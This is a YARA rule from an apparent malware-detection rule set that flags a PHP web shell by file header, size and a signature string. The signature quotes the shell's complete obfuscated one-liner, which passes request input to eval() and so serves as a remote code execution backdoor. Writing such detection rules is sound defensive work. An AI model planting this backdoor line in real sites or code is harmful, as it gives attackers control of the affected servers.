rule infected_09_06_18_internal_tool {
  meta:
    description = "shells - file internal.tool.php"
    author      = "Brian Laskowski"
    reference   = "https://github.com/Hestat/lw-yara/"
    date        = "2018-09-06"
    hash1       = "1acd45f0106bc7a327a04dbc502a2d7f88d9d921ea6530636210d8a9d885920a"

  strings:
    $s1 = "<?php /*PNyp*/if/*rByE*/(isset($_REQUEST['gZuIi']))/*cf*/{/*ROcdB*/eval($_REQUEST['gZuIi']);/*JBol*/exit;/*G*/}?>" fullword ascii

  condition:
    (uint16(0) == 0x3f3c and
      filesize < 1KB and
      (all of them)
    ) or (all of them)
}